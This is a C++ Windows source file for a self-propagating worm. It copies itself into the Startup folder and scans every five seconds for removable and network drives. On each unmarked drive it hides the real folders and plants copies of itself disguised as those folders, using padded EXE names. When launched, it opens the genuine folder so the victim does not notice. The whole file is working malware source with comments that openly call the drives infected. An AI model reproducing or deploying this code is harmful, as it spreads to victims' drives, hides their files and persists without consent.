
#include <windows.h>
#include <cstdio>

#include "fsse_util.h"

const char *FILE_FLAG_PATH = "fsse";
const char szUniqueNamedMutex[] = "fsse_mutex";

TCHAR drive_str_buf[MAX_PATH];
DWORD ds_len;

UINT drive_type;

TCHAR path_buf[MAX_PATH];
TCHAR assembly_path[MAX_PATH];

/**
 * Check if the drive is marked
 * @param root_path The root path of the drive
 * @return whether the drive is marked
 */
BOOL contains_marker(TCHAR *root_path) {
    strcat(strcpy(path_buf, root_path), FILE_FLAG_PATH);
    return FileExists(path_buf);
}

/**
 * Mark the drive as infected
 * @param root_path The root path of the drive
 */
void create_marker(TCHAR *root_path) {
    strcat(strcpy(path_buf, root_path), FILE_FLAG_PATH);
    CloseHandle(CreateFile(path_buf, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL));
#ifndef TEST
    SetFileAttributes(path_buf, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
#endif
}

/**
 * Create the longest possible filename viewable in Windows Explorer
 * @param buf Buffer to store the filename
 * @param root_path The root path of drive
 * @param file_name The file name of file
 * @param ext File extension
 */
void max_pad_path(TCHAR *buf, TCHAR *root_path, TCHAR *file_name, const char *ext) {
    size_t cLen = 246 - strlen(root_path) - strlen(file_name) - strlen(ext);
    char *pad = (char *) malloc((cLen + 1) * sizeof(char));
    memset(pad, ' ', cLen);
    pad[cLen] = '\0';
    snprintf(path_buf, MAX_PATH, "%s%s%s.%s", root_path, file_name, pad, ext);
    free(pad);
}

/**
 * Infects specified drive
 * @param root_path The root path of the drive
 */
void infect_routine(TCHAR *root_path) {
    printf("infecting %s\n", root_path);
    create_marker(root_path);

    // iterate through all root directory folders
    WIN32_FIND_DATA ffd;
    LARGE_INTEGER filesize;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    strcat(strcpy(path_buf, root_path), TEXT("\\*"));

    hFind = FindFirstFile(path_buf, &ffd);

    if (hFind == INVALID_HANDLE_VALUE) {
        printf("INVALID_HANDLE_VALUE\n");
        return;
    }
    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            printf("\tfound folder %s\n", ffd.cFileName);

            // ignore SYSTEM folders
            strcat(strcpy(path_buf, root_path), ffd.cFileName);
            DWORD fattrib = GetFileAttributes(path_buf);
            if (!(fattrib & FILE_ATTRIBUTE_SYSTEM)) {
                printf("\t\thiding original folder\n");
#ifndef TEST
                SetFileAttributes(path_buf, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
#endif
                // copy running assembly
                printf("\t\tcopying dummy executable\n");
                max_pad_path(path_buf, root_path, ffd.cFileName, "EXE");
                CopyFile(assembly_path, path_buf, FALSE);
            }
        }
    } while (FindNextFile(hFind, &ffd) != 0);
    FindClose(hFind);
}

int WinMain(HINSTANCE hInstance,
            HINSTANCE hPrevInstance,
            LPTSTR lpCmdLine,
            int nCmdShow) {
    // open folder with same name if it exists
    GetModuleFileName(NULL, assembly_path, MAX_PATH);
    strcpy(path_buf, assembly_path);
    path_buf[strlen(assembly_path) - 5] = 0;
    if (FolderExists(path_buf)) {
        ShellExecute(NULL, "explore", path_buf, NULL, NULL, SW_SHOW);
    }

    // kill itself if mutex exists
    HANDLE hHandle = CreateMutex(NULL, TRUE, szUniqueNamedMutex);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 1;
    }

    // add to startup
#ifndef TEST
    GetStartupFolderPath(path_buf);
    strcat(path_buf, "\\fsse.exe");
    CopyFile(assembly_path, path_buf, TRUE);
#endif

    while (true) {
        printf("doing scan cycle\n");
        // query all logical drives on computer
        ds_len = GetLogicalDriveStrings(MAX_PATH, drive_str_buf);
        for (int i = 0; i < ds_len; i += 4) {
            TCHAR *root_path = drive_str_buf + i;
            drive_type = GetDriveType(root_path);

            // test if selected drive is a removable/network drive
            if (drive_type == DRIVE_REMOVABLE || drive_type == DRIVE_REMOTE) {
                if (!contains_marker(root_path)) {
                    infect_routine(root_path);
                }
            }
        }
        printf("done scan cycle\n");
        Sleep(5000);
    }
    ReleaseMutex(hHandle);
    CloseHandle(hHandle);
    return 0;
}